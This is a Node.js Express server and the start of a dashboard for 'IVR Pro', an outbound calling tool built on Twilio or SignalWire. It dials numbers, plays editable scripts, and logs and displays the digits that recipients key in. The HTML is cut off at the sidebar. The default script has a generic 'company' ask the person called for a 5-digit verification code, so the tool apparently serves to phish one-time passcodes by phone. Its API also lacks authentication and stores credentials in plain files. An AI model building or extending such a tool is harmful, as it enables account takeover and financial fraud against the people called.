require("dotenv").config();
const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const { v4: uuidv4 } = require("uuid");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cors());

// ── File paths ───────────────────────────────────────────────────────────────
const F = {
  settings: path.join(__dirname, "settings.json"),
  scripts:  path.join(__dirname, "scripts.json"),
  logs:     path.join(__dirname, "logs.json"),
};

// ── Defaults ─────────────────────────────────────────────────────────────────
const DEFAULT_SETTINGS = {
  activeProvider: "twilio",
  twilio:     { accountSid:"", authToken:"", fromNumber:"", baseUrl:"" },
  signalwire: { projectId:"", authToken:"", fromNumber:"", baseUrl:"", spaceUrl:"" },
  voice: "alice", language: "en-US", companyName: "My Company",
  activeScriptId: null
};

const DEFAULT_SCRIPT = {
  id: "default",
  name: "Default Script",
  isDefault: true,
  createdAt: new Date().toISOString(),
  greeting: { message: "Hello! This is a call from our company. Press 1 to continue, or press 2 to end this call.", timeout: 10, noInputMessage: "We did not receive your input. Goodbye." },
  steps: [{ label: "Verification Code", message: "Please enter your 5-digit verification code, then press hash.", maxDigits: 5, timeout: 15, confirmMessage: "Thank you. " }],
  successMessage: "Thank you. Your information has been received. Have a wonderful day. Goodbye.",
  cancelMessage: "No problem. Your request has been cancelled. Goodbye.",
  errorMessage: "We did not receive your input. Please call us back. Goodbye."
};

// ── Storage helpers ──────────────────────────────────────────────────────────
function read(file, def) {
  try { if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file)); } catch(e) {}
  return typeof def === "function" ? def() : JSON.parse(JSON.stringify(def));
}
function write(file, data) { fs.writeFileSync(file, JSON.stringify(data, null, 2)); }

function loadSettings() { return { ...DEFAULT_SETTINGS, ...read(F.settings, DEFAULT_SETTINGS) }; }
function saveSettings(d) { write(F.settings, d); }
function loadScripts() {
  const s = read(F.scripts, null);
  if (!s || !s.length) return [JSON.parse(JSON.stringify(DEFAULT_SCRIPT))];
  return s;
}
function saveScripts(d) { write(F.scripts, d); }
function loadLogs() { return read(F.logs, []); }
function saveLogs(d) { write(F.logs, d); }

// ── Active provider client ───────────────────────────────────────────────────
function makeClient(settings) {
  const p = settings.activeProvider;
  if (p === "twilio") {
    const c = settings.twilio;
    if (!c.accountSid || !c.authToken) return null;
    return { client: require("twilio")(c.accountSid, c.authToken), provider: "twilio", from: c.fromNumber, baseUrl: c.baseUrl };
  }
  if (p === "signalwire") {
    const c = settings.signalwire;
    if (!c.projectId || !c.authToken) return null;
    const twilio = require("twilio");
    return { client: twilio(c.projectId, c.authToken, { accountSid: c.projectId, lazyLoading: true }), provider: "signalwire", from: c.fromNumber, baseUrl: c.baseUrl, spaceUrl: c.spaceUrl };
  }
  return null;
}

function getActiveScript(settings, scripts) {
  if (settings.activeScriptId) {
    const s = scripts.find(x => x.id === settings.activeScriptId);
    if (s) return s;
  }
  return scripts.find(x => x.isDefault) || scripts[0];
}

// ── In-memory call sessions ───────────────────────────────────────────────────
const sessions = {};

// ── SETTINGS API ─────────────────────────────────────────────────────────────
app.get("/api/settings", (req, res) => {
  const s = loadSettings();
  const safe = JSON.parse(JSON.stringify(s));
  if (safe.twilio.authToken) safe.twilio.authToken = "••••" + safe.twilio.authToken.slice(-4);
  if (safe.signalwire.authToken) safe.signalwire.authToken = "••••" + safe.signalwire.authToken.slice(-4);
  res.json(safe);
});

app.post("/api/settings", (req, res) => {
  const cur = loadSettings();
  const body = req.body;
  const updated = { ...cur, ...body };
  // Merge provider objects carefully, preserve masked tokens
  if (body.twilio) {
    updated.twilio = { ...cur.twilio, ...body.twilio };
    if (body.twilio.authToken && body.twilio.authToken.startsWith("••••")) updated.twilio.authToken = cur.twilio.authToken;
  }
  if (body.signalwire) {
    updated.signalwire = { ...cur.signalwire, ...body.signalwire };
    if (body.signalwire.authToken && body.signalwire.authToken.startsWith("••••")) updated.signalwire.authToken = cur.signalwire.authToken;
  }
  saveSettings(updated);
  res.json({ success: true });
});

// ── TEST CONNECTION API ───────────────────────────────────────────────────────
app.get("/api/test", async (req, res) => {
  const s = loadSettings();
  const p = s.activeProvider;
  const creds = p === "twilio" ? s.twilio : s.signalwire;
  const sid = p === "twilio" ? creds.accountSid : creds.projectId;
  if (!sid) return res.json({ ok: false, error: `${p} credentials not set. Go to Settings.` });
  if (!creds.fromNumber) return res.json({ ok: false, error: "Phone number not set." });
  if (!creds.baseUrl) return res.json({ ok: false, error: "Server URL not set. Click Auto-detect in Settings." });
  try {
    const ctx = makeClient(s);
    if (!ctx) return res.json({ ok: false, error: "Could not create client." });
    const account = await ctx.client.api.accounts(sid).fetch();
    res.json({ ok: true, name: account.friendlyName, provider: p });
  } catch(err) {
    res.json({ ok: false, error: err.message });
  }
});

// ── SCRIPTS API ───────────────────────────────────────────────────────────────
app.get("/api/scripts", (req, res) => res.json(loadScripts()));

app.post("/api/scripts", (req, res) => {
  const scripts = loadScripts();
  const body = req.body;
  if (body.id) {
    const idx = scripts.findIndex(s => s.id === body.id);
    if (idx >= 0) { scripts[idx] = { ...scripts[idx], ...body, updatedAt: new Date().toISOString() }; }
    else { scripts.push({ ...body, createdAt: new Date().toISOString() }); }
  } else {
    scripts.push({ ...body, id: uuidv4(), createdAt: new Date().toISOString() });
  }
  saveScripts(scripts);
  res.json({ success: true, scripts });
});

app.delete("/api/scripts/:id", (req, res) => {
  let scripts = loadScripts();
  if (scripts.length <= 1) return res.status(400).json({ error: "Cannot delete the last script." });
  scripts = scripts.filter(s => s.id !== req.params.id);
  // If deleted was default, make first one default
  if (!scripts.find(s => s.isDefault)) scripts[0].isDefault = true;
  saveScripts(scripts);
  res.json({ success: true, scripts });
});

app.post("/api/scripts/:id/default", (req, res) => {
  const scripts = loadScripts();
  scripts.forEach(s => s.isDefault = s.id === req.params.id);
  saveScripts(scripts);
  // Also update active
  const settings = loadSettings();
  settings.activeScriptId = req.params.id;
  saveSettings(settings);
  res.json({ success: true });
});

app.post("/api/scripts/active", (req, res) => {
  const settings = loadSettings();
  settings.activeScriptId = req.body.scriptId;
  saveSettings(settings);
  res.json({ success: true });
});

// ── LOGS API ──────────────────────────────────────────────────────────────────
app.get("/api/logs", (req, res) => res.json(loadLogs()));

app.delete("/api/logs/:id", (req, res) => {
  const logs = loadLogs().filter(l => l.id !== req.params.id);
  saveLogs(logs);
  res.json({ success: true });
});

app.delete("/api/logs", (req, res) => {
  saveLogs([]);
  res.json({ success: true });
});

// ── CALL API ──────────────────────────────────────────────────────────────────
app.post("/api/call", async (req, res) => {
  const { phoneNumber, label, scriptId } = req.body;
  if (!phoneNumber) return res.status(400).json({ error: "Phone number required." });
  const settings = loadSettings();
  const ctx = makeClient(settings);
  if (!ctx) return res.status(400).json({ error: "Provider credentials not configured. Go to Settings." });
  const scripts = loadScripts();
  const script = scriptId ? scripts.find(s => s.id === scriptId) : getActiveScript(settings, scripts);
  if (!script) return res.status(400).json({ error: "No script found. Create one in Script Builder." });
  try {
    const callOpts = {
      to: phoneNumber, from: ctx.from,
      url: ctx.baseUrl + "/twiml/start?scriptId=" + script.id,
      statusCallback: ctx.baseUrl + "/twiml/status",
      statusCallbackMethod: "POST",
      statusCallbackEvent: ["initiated", "ringing", "answered", "completed"]
    };
    if (ctx.provider === "signalwire" && ctx.spaceUrl) {
      callOpts.to = "sip:" + phoneNumber.replace("+","") + "@" + ctx.spaceUrl;
    }
    const call = await ctx.client.calls.create(callOpts);
    const logEntry = {
      id: uuidv4(), callSid: call.sid, phone: phoneNumber,
      label: label || "Call", scriptName: script.name,
      provider: ctx.provider, status: "initiated", statusDetail: "Dialing...",
      startTime: new Date().toISOString(), endTime: null, duration: null,
      currentStep: -1, collected: [], steps: script.steps.length
    };
    sessions[call.sid] = logEntry;
    // Also add to persistent logs
    const logs = loadLogs();
    logs.unshift(logEntry);
    saveLogs(logs);
    res.json({ success: true, callSid: call.sid, logId: logEntry.id });
  } catch(err) { res.status(500).json({ error: err.message }); }
});

// ── END CALL API ──────────────────────────────────────────────────────────────
app.post("/api/call/:sid/end", async (req, res) => {
  const { sid } = req.params;
  const settings = loadSettings();
  const ctx = makeClient(settings);
  if (!ctx) return res.status(400).json({ error: "No provider configured." });
  try {
    await ctx.client.calls(sid).update({ status: "completed" });
    if (sessions[sid]) {
      sessions[sid].status = "ended-by-user";
      sessions[sid].statusDetail = "Call ended by you";
      syncLog(sessions[sid]);
    }
    res.json({ success: true });
  } catch(err) { res.status(500).json({ error: err.message }); }
});

// ── SESSIONS (live) ───────────────────────────────────────────────────────────
app.get("/api/sessions", (req, res) => {
  res.json(Object.values(sessions).sort((a,b) => new Date(b.startTime) - new Date(a.startTime)));
});

// ── SYNC log helper ───────────────────────────────────────────────────────────
function syncLog(session) {
  const logs = loadLogs();
  const idx = logs.findIndex(l => l.callSid === session.callSid);
  if (idx >= 0) logs[idx] = { ...logs[idx], ...session };
  else logs.unshift(session);
  saveLogs(logs);
}

// ── TWIML ─────────────────────────────────────────────────────────────────────
function getProviderSettings() {
  const s = loadSettings();
  const p = s.activeProvider === "twilio" ? s.twilio : s.signalwire;
  return { voice: s.voice, language: s.language, baseUrl: p.baseUrl };
}

app.post("/twiml/start", (req, res) => {
  const { voice, language, baseUrl } = getProviderSettings();
  const scriptId = req.query.scriptId;
  const scripts = loadScripts();
  const script = scripts.find(s => s.id === scriptId) || scripts[0];
  const { VoiceResponse } = require("twilio").twiml;
  const twiml = new VoiceResponse();
  const sid = req.body.CallSid;
  if (sessions[sid]) { sessions[sid].status = "ringing"; sessions[sid].statusDetail = "Playing greeting..."; syncLog(sessions[sid]); }
  const g = twiml.gather({ numDigits:1, action:`${baseUrl}/twiml/greeting-response?scriptId=${scriptId}`, method:"POST", timeout: script.greeting.timeout });
  g.say({ voice, language }, script.greeting.message);
  twiml.say({ voice, language }, script.greeting.noInputMessage);
  twiml.hangup();
  res.type("text/xml").send(twiml.toString());
});

app.post("/twiml/greeting-response", (req, res) => {
  const { voice, language, baseUrl } = getProviderSettings();
  const scriptId = req.query.scriptId;
  const scripts = loadScripts();
  const script = scripts.find(s => s.id === scriptId) || scripts[0];
  const { VoiceResponse } = require("twilio").twiml;
  const twiml = new VoiceResponse();
  const sid = req.body.CallSid;
  const digit = req.body.Digits;
  if (digit === "2") {
    if (sessions[sid]) { sessions[sid].status = "cancelled"; sessions[sid].statusDetail = "Caller declined"; syncLog(sessions[sid]); }
    twiml.say({ voice, language }, script.cancelMessage); twiml.hangup();
    return res.type("text/xml").send(twiml.toString());
  }
  if (digit === "1") {
    if (sessions[sid]) { sessions[sid].status = "in-progress"; sessions[sid].statusDetail = "Accepted"; syncLog(sessions[sid]); }
    return res.redirect(307, `${baseUrl}/twiml/step/0?scriptId=${scriptId}`);
  }
  twiml.say({ voice, language }, "Invalid input. " + script.greeting.message);
  twiml.redirect(`${baseUrl}/twiml/start?scriptId=${scriptId}`);
  res.type("text/xml").send(twiml.toString());
});

app.all("/twiml/step/:index", (req, res) => {
  const { voice, language, baseUrl } = getProviderSettings();
  const scriptId = req.query.scriptId;
  const scripts = loadScripts();
  const script = scripts.find(s => s.id === scriptId) || scripts[0];
  const { VoiceResponse } = require("twilio").twiml;
  const index = parseInt(req.params.index, 10);
  const step = script.steps[index];
  const sid = req.body.CallSid;
  const twiml = new VoiceResponse();
  if (!step) {
    if (sessions[sid]) { sessions[sid].status = "completed"; sessions[sid].statusDetail = "All steps done"; syncLog(sessions[sid]); }
    twiml.say({ voice, language }, script.successMessage); twiml.hangup();
    return res.type("text/xml").send(twiml.toString());
  }
  if (sessions[sid]) { sessions[sid].currentStep = index; sessions[sid].statusDetail = "Waiting: " + step.label; syncLog(sessions[sid]); }
  const g = twiml.gather({ numDigits: step.maxDigits, finishOnKey:"#", action:`${baseUrl}/twiml/collect/${index}?scriptId=${scriptId}`, method:"POST", timeout: step.timeout });
  g.say({ voice, language }, step.message);
  twiml.say({ voice, language }, script.errorMessage);
  twiml.hangup();
  res.type("text/xml").send(twiml.toString());
});

app.post("/twiml/collect/:index", (req, res) => {
  const { voice, language, baseUrl } = getProviderSettings();
  const scriptId = req.query.scriptId;
  const scripts = loadScripts();
  const script = scripts.find(s => s.id === scriptId) || scripts[0];
  const { VoiceResponse } = require("twilio").twiml;
  const index = parseInt(req.params.index, 10);
  const sid = req.body.CallSid;
  const digits = req.body.Digits;
  const step = script.steps[index];
  const twiml = new VoiceResponse();
  if (sessions[sid]) {
    sessions[sid].collected.push({ step: index, label: step.label, value: digits, time: new Date().toISOString() });
    sessions[sid].currentStep = index + 1;
    sessions[sid].statusDetail = "Received: " + step.label;
    syncLog(sessions[sid]);
  }
  if (index === script.steps.length - 1 && digits === "2") {
    if (sessions[sid]) { sessions[sid].status = "cancelled"; sessions[sid].statusDetail = "Caller cancelled"; syncLog(sessions[sid]); }
    twiml.say({ voice, language }, script.cancelMessage); twiml.hangup();
    return res.type("text/xml").send(twiml.toString());
  }
  if (step.confirmMessage) twiml.say({ voice, language }, step.confirmMessage);
  twiml.redirect(`${baseUrl}/twiml/step/${index + 1}?scriptId=${scriptId}`);
  res.type("text/xml").send(twiml.toString());
});

app.post("/twiml/status", (req, res) => {
  const sid = req.body.CallSid;
  const cs = req.body.CallStatus;
  const duration = req.body.CallDuration;
  if (sessions[sid]) {
    const s = sessions[sid];
    if (cs === "ringing") s.statusDetail = "Ringing...";
    else if (cs === "answered") { s.status = "in-progress"; s.statusDetail = "Connected"; }
    else if (cs === "completed" && !["cancelled","completed","ended-by-user"].includes(s.status)) { s.status = "completed"; s.statusDetail = "Completed"; }
    else if (["no-answer","busy","failed"].includes(cs)) { s.status = cs; s.statusDetail = cs.replace("-"," "); }
    if (duration) s.duration = parseInt(duration);
    if (["completed","cancelled","no-answer","busy","failed"].includes(cs)) {
      s.endTime = new Date().toISOString();
    }
    syncLog(s);
  }
  res.sendStatus(200);
});

// ── DASHBOARD HTML ────────────────────────────────────────────────────────────
const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>IVR Pro</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0b0d12;--surf:#11141b;--card:#171c26;--border:#1f2535;--border2:#2a3245;
  --green:#10e085;--gdim:#0a9558;--blue:#4a8ff7;--amber:#f5a623;
  --red:#f0444a;--purple:#9d7cfa;--teal:#22d3c8;
  --text:#dde3f0;--text2:#8592ad;--text3:#4e5c78;
  --font:'Outfit',sans-serif;--mono:'JetBrains Mono',monospace;
}
html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--font)}
button,input,textarea,select{font-family:var(--font)}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border2);border-radius:10px}

.shell{display:flex;height:100vh;overflow:hidden}

/* SIDEBAR */
.sidebar{width:290px;min-width:290px;background:var(--surf);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
.logo{padding:18px 18px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
.logo-icon{width:34px;height:34px;background:var(--green);border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.logo-icon svg{width:17px;height:17px}
.logo-text .name{font-size:16px;font-weight:700;letter-spacing:-0.3px}
.logo-text .sub{font-size:10px;color:var(--text3);letter-spacing:0.5px;text-transform:uppercase;margin-top:1px}

/* Provider switch */
.provider-switch{margin:14px 16px;background:var(--bg);border:1px solid var(--border);border-radius:9px;padding:4px;display:flex;gap:4px}
.prov-btn{flex:1;padding:7px;border:none;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer;background:transparent;color:var(--text2);transition:all 0.15s}
.prov-btn.active-tw{background:var(--blue);color:#fff}
.prov-btn.active-sw{background:var(--purple);color:#fff}
.prov-status{text-align:center;font-size:10px;color:var(--text3);margin:-6px 16px 10px;padding-bottom:10px;border-bottom:1px solid var(--border)}

/* Dialer */
.dialer{padding:14px 16px;border-bottom:1px solid var(--border)}
.sec-label{font-size:10px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3);margin-bottom:10px}
.field{margin-bottom:9px}
.field label{display:block;font-size:11px;font-weight:500;color:var(--text2);margin-bottom:4px}
.field input,.field select{width:100%;background:var(--bg);border:1px solid var(--border2);border-radius:7px;padding:8px 10px;color:var(--text);font-size:13px;outline:none;transition:border-color 0.15s}
.field input:focus,.field select:focus{border-color:var(--green)}
.field input::placeholder{color:var(--text3)}
.field select option{background:var(--card)}
.script-select-row{display:flex;gap:6px;align-items:center}
.script-select-row select{flex:1}
.btn-call{width:100%;padding:11px;background:var(--green);color:#000;border:none;border-radius:8px;font-size:14px;font-weight:600;display:flex;align-items:center;justify-content:center;gap:8px;cursor:pointer;transition:opacity 0.15s;margin-top:6px}
.btn-call:hover{opacity:0.88}:hover.btn-call:active{transform:scale(0.98)}
.btn-call:disabled{opacity:0.4;cursor:not-allowed}
.btn-test{width:100%;margin-top:6px;padding:8px;background:none;border:1px solid var(--border2);border-radius:7px;color:var(--text2);font-size:12px;cursor:pointer;transition:all 0.15s}
.btn-test:hover{border-color:var(--blue);color:var(--blue)}
.call-msg{margin-top:8px;padding:9px 12px;border-radius:7px;font-size:12px;font-weight:500;display:none;line-height:1.4}
.call-msg.err{background:#f0444a18;border:1px solid #f0444a35;color:var(--red);display:block}
.call-msg.ok{background:#10e08518;border:1px solid #10e08535;color:var(--green);display:block}
.call-msg.info{background:#4a8ff718;border:1px solid #4a8ff735;color:var(--blue);display:block}

/* Stats */
.stats{padding:12px 16px;border-bottom:1px solid var(--border)}
.stats-row{display:flex;gap:4px}
.stat{flex:1;background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:8px 6px;text-align:center}
.stat-n{font-size:20px;font-weight:700}
.stat-l{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:0.5px;margin-top:1px}
.live-pill{margin-top:10px;padding:5px 10px;border-radius:20px;background:#10e08510;border:1px solid #10e08528;display:flex;align-items:center;gap:6px;font-size:10px;color:var(--green)}
.dot{width:5px;height:5px;border-radius:50%;background:var(--green);animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}

/* MAIN */
.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
.tabbar{display:flex;padding:0 20px;border-bottom:1px solid var(--border);background:var(--surf);gap:2px}
.tab{padding:14px 16px;font-size:13px;font-weight:500;color:var(--text2);border:none;background:none;border-bottom:2px solid transparent;cursor:pointer;transition:color 0.15s;margin-bottom:-1px}
.tab:hover{color:var(--text)}
.tab.active{color:var(--green);border-bottom-color:var(--green)}
.panel{flex:1;overflow-y:auto;display:none;padding:20px}
.panel.active{display:block}
.ph{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:18px}
.ph-title{font-size:17px;font-weight:700}
.ph-sub{font-size:12px;color:var(--text2);margin-top:2px}

/* MONITOR */
.mon-grid{display:flex;flex-direction:column;gap:12px}
.empty{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:70px 20px;color:var(--text3);text-align:center}
.empty-icon{font-size:38px;margin-bottom:12px;opacity:0.3}
.empty-title{font-size:15px;font-weight:500;color:var(--text2);margin-bottom:5px}
.empty-sub{font-size:12px;line-height:1.6}

/* Call card */
.ccard{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;transition:border-color 0.2s}
.ccard.s-in-progress{border-color:var(--gdim);animation:glow 2s ease-in-out infinite}
.ccard.s-completed{border-color:#10e08530}
.ccard.s-cancelled,.ccard.s-failed,.ccard.s-no-answer,.ccard.s-busy,.ccard.s-ended-by-user{border-color:#f0444a28}
@keyframes glow{0%,100%{box-shadow:0 0 0 0 transparent}50%{box-shadow:0 0 0 3px #10e08510}}
.chead{padding:12px 16px;display:flex;justify-content:space-between;align-items:flex-start;border-bottom:1px solid var(--border)}
.cphone{font-size:17px;font-weight:700;font-family:var(--mono)}
.clabel{font-size:11px;color:var(--text2);margin-top:2px}
.cright{display:flex;flex-direction:column;align-items:flex-end;gap:4px}
.ctime{font-size:10px;color:var(--text3)}
.badge{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:20px;font-size:10px;font-weight:600;text-transform:uppercase}
.bdot{width:5px;height:5px;border-radius:50%;background:currentColor}
.bdot-pulse{animation:pulse 1.2s infinite}
.badge-initiated,.badge-ringing{background:#f5a62320;color:var(--amber)}
.badge-in-progress{background:#10e08520;color:var(--green)}
.badge-completed{background:#10e08515;color:#0cc070}
.badge-cancelled,.badge-failed,.badge-no-answer,.badge-busy,.badge-ended-by-user{background:#f0444a18;color:var(--red)}
.cbody{padding:12px 16px}
.prog-track{display:flex;gap:4px;margin-bottom:10px}
.pseg{height:3px;flex:1;border-radius:2px;background:var(--border2);transition:background 0.3s}
.pseg.done{background:var(--green)}
.pseg.active{background:var(--blue);animation:blink 1s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
.coll-list{display:flex;flex-direction:column;gap:5px}
.coll-item{display:flex;align-items:center;gap:8px;background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:7px 10px}
.ci-lbl{font-size:10px;color:var(--text2);flex:1;text-transform:uppercase;letter-spacing:0.5px}
.ci-val{font-family:var(--mono);font-size:14px;font-weight:500;color:var(--green);background:#10e08510;padding:2px 8px;border-radius:4px;letter-spacing:2px}
.ci-t{font-size:10px;color:var(--text3)}
.cfoot{display:flex;align-items:center;justify-content:space-between;margin-top:10px;padding-top:10px;border-top:1px solid var(--border)}
.cdetail{font-size:11px;color:var(--text2)}
.cactions{display:flex;gap:6px}
.btn-sm{padding:4px 10px;border-radius:6px;font-size:11px;cursor:pointer;border:1px solid var(--border2);background:none;color:var(--text2);transition:all 0.15s}
.btn-sm:hover{border-color:var(--green);color:var(--green)}
.btn-sm.danger:hover{border-color:var(--red);color:var(--red)}
.btn-sm.end-call{border-color:#f0444a50;color:var(--red)}
.btn-sm.end-call:hover{background:#f0444a18}
.sdot{width:6px;height:6px;border-radius:50%;background:var(--amber);flex-shrink:0;display:inline-block;margin-right:5px}
.sdot.active{animation:pulse 1s infinite}

/* SCRIPT BUILDER */
.script-library{display:flex;gap:12px;margin-bottom:18px;overflow-x:auto;padding-bottom:4px}
.slib-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px 14px;min-width:160px;cursor:pointer;transition:border-color 0.15s;flex-shrink:0;position:relative}
.slib-card:hover{border-color:var(--border2)}
.slib-card.selected{border-color:var(--green);background:#10e08508}
.slib-card.is-default::after{content:"DEFAULT";position:absolute;top:8px;right:8px;font-size:8px;font-weight:700;color:var(--green);letter-spacing:0.5px}
.slib-name{font-size:13px;font-weight:600;margin-bottom:3px}
.slib-meta{font-size:10px;color:var(--text3)}
.slib-actions{display:flex;gap:5px;margin-top:8px}
.btn-slib{padding:3px 8px;border-radius:5px;font-size:10px;font-weight:500;border:1px solid var(--border2);background:none;color:var(--text2);cursor:pointer;transition:all 0.15s}
.btn-slib:hover{border-color:var(--green);color:var(--green)}
.btn-slib.danger:hover{border-color:var(--red);color:var(--red)}
.btn-slib.set-default{border-color:#10e08530;color:var(--green)}
.slib-new{border-style:dashed;border-color:var(--border2);color:var(--text2);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px}
.slib-new:hover{border-color:var(--green);color:var(--green)}
.slib-new-icon{font-size:22px;opacity:0.5}

.ssec{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px;margin-bottom:14px}
.ssec-title{font-size:13px;font-weight:600;margin-bottom:12px}
.fg{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.ff{display:flex;flex-direction:column;gap:4px}
.ff label{font-size:11px;font-weight:500;color:var(--text2)}
.ff.full{grid-column:1/-1}
.ff input,.ff select,.ff textarea{background:var(--bg);border:1px solid var(--border2);border-radius:7px;padding:8px 10px;color:var(--text);font-size:13px;outline:none;resize:vertical;transition:border-color 0.15s}
.ff textarea{min-height:60px;line-height:1.5}
.ff input:focus,.ff select:focus,.ff textarea:focus{border-color:var(--green)}
.ff input::placeholder,.ff textarea::placeholder{color:var(--text3)}
.ff select option{background:var(--card)}
.step-card{background:var(--bg);border:1px solid var(--border2);border-radius:9px;padding:12px;margin-bottom:8px}
.step-hd{display:flex;align-items:center;gap:8px;margin-bottom:10px}
.step-num{width:22px;height:22px;border-radius:50%;background:var(--blue);color:#fff;font-size:10px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.step-name{flex:1;background:transparent;border:none;border-bottom:1px solid var(--border2);color:var(--text);font-size:13px;font-weight:600;padding:2px 0;outline:none}
.step-name:focus{border-bottom-color:var(--green)}
.btn-rm{background:none;border:none;color:var(--text3);font-size:17px;cursor:pointer;padding:0 3px;transition:color 0.15s}
.btn-rm:hover{color:var(--red)}
.sg{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.sf{display:flex;flex-direction:column;gap:3px}
.sf.full{grid-column:1/-1}
.sf label{font-size:10px;font-weight:500;color:var(--text3);text-transform:uppercase;letter-spacing:0.5px}
.sf input,.sf textarea{background:var(--surf);border:1px solid var(--border);border-radius:6px;padding:6px 9px;color:var(--text);font-size:12px;outline:none;resize:vertical;transition:border-color 0.15s}
.sf input:focus,.sf textarea:focus{border-color:var(--green)}
.sf input::placeholder,.sf textarea::placeholder{color:var(--text3)}
.btn-add{width:100%;padding:9px;background:none;border:1px dashed var(--border2);border-radius:7px;color:var(--text2);font-size:12px;cursor:pointer;transition:all 0.15s;margin-bottom:4px}
.btn-add:hover{border-color:var(--green);color:var(--green)}
.save-row{display:flex;align-items:center;gap:10px;margin-top:14px}
.btn-save{padding:10px 20px;background:var(--green);color:#000;border:none;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;transition:opacity 0.15s}
.btn-save:hover{opacity:0.88}
.saved-msg{font-size:12px;color:var(--green);display:none}
.saved-msg.show{display:block}
.script-name-bar{display:flex;gap:8px;align-items:center;margin-bottom:14px}
.script-name-input{flex:1;background:var(--bg);border:1px solid var(--border2);border-radius:7px;padding:8px 12px;color:var(--text);font-size:15px;font-weight:600;outline:none}
.script-name-input:focus{border-color:var(--green)}

/* LOGS */
.logs-toolbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
.btn-clear{padding:6px 14px;background:none;border:1px solid var(--border2);border-radius:7px;color:var(--text2);font-size:12px;cursor:pointer;transition:all 0.15s}
.btn-clear:hover{border-color:var(--red);color:var(--red)}
.log-table{width:100%;border-collapse:collapse}
.log-table th{font-size:10px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:0.5px;padding:8px 12px;text-align:left;border-bottom:1px solid var(--border)}
.log-table td{padding:10px 12px;border-bottom:1px solid var(--border);font-size:12px;vertical-align:middle}
.log-table tr:hover td{background:#ffffff04}
.dur{font-family:var(--mono);color:var(--text2)}
.log-expand{cursor:pointer;color:var(--blue);font-size:11px}
.log-detail{padding:10px 12px;background:var(--bg);border-bottom:1px solid var(--border);display:none}
.log-detail.open{display:block}
.detail-grid{display:flex;flex-wrap:wrap;gap:8px}
.detail-chip{background:var(--card);border:1px solid var(--border);border-radius:6px;padding:5px 10px}
.dc-label{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:0.5px}
.dc-val{font-family:var(--mono);font-size:13px;color:var(--green);margin-top:2px;letter-spacing:1px}
.no-logs{text-align:center;color:var(--text3);padding:50px;font-size:13px}

/* SETTINGS */
.cfg-sec{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px;margin-bottom:14px}
.cfg-title{font-size:13px;font-weight:600;margin-bottom:12px}
.cfg-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.cfg-full{grid-column:1/-1}
.cfg-hr{grid-column:1/-1;border:none;border-top:1px solid var(--border);margin:2px 0}
.cf{display:flex;flex-direction:column;gap:4px}
.cf label{font-size:11px;font-weight:500;color:var(--text2)}
.cf input,.cf select,.cf textarea{background:var(--bg);border:1px solid var(--border2);border-radius:7px;padding:8px 10px;color:var(--text);font-size:13px;outline:none;transition:border-color 0.15s}
.cf input:focus,.cf select:focus{border-color:var(--green)}
.cf input::placeholder{color:var(--text3)}
.cf select option{background:var(--card)}
.cf .note{font-size:10px;color:var(--text3);margin-top:3px;line-height:1.4}
.cf .note a{color:var(--blue);text-decoration:none}
.url-row{display:flex;gap:6px}
.btn-detect{padding:8px 10px;background:none;border:1px solid var(--border2);border-radius:7px;color:var(--text2);font-size:11px;cursor:pointer;white-space:nowrap;transition:all 0.15s}
.btn-detect:hover{border-color:var(--blue);color:var(--blue)}
.prov-tab{display:none}
.prov-tab.active{display:contents}
.voice-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;margin-top:8px}
.vo{position:relative;padding:9px 11px;background:var(--bg);border:1px solid var(--border2);border-radius:8px;cursor:pointer;transition:border-color 0.15s}
.vo:has(input:checked){border-color:var(--green);background:#10e08508}
.vo input{position:absolute;opacity:0;width:0;height:0}
.vo-name{font-size:12px;font-weight:600}
.vo-desc{font-size:10px;color:var(--text2);margin-top:1px}
.vo-tag{font-size:9px;padding:1px 5px;border-radius:3px;margin-top:3px;display:inline-block}
.tag-free{background:#10e08518;color:var(--green)}
.tag-natural{background:#4a8ff718;color:var(--blue)}
.tag-premium{background:#9d7cfa18;color:var(--purple)}
.sw-provider-notice{background:#9d7cfa12;border:1px solid #9d7cfa30;border-radius:8px;padding:12px;font-size:12px;color:var(--text2);line-height:1.6;margin-bottom:10px}
</style>
</head>
<body>
<div class="shell">

<!-- SIDEBAR -->
<aside class="sidebar">
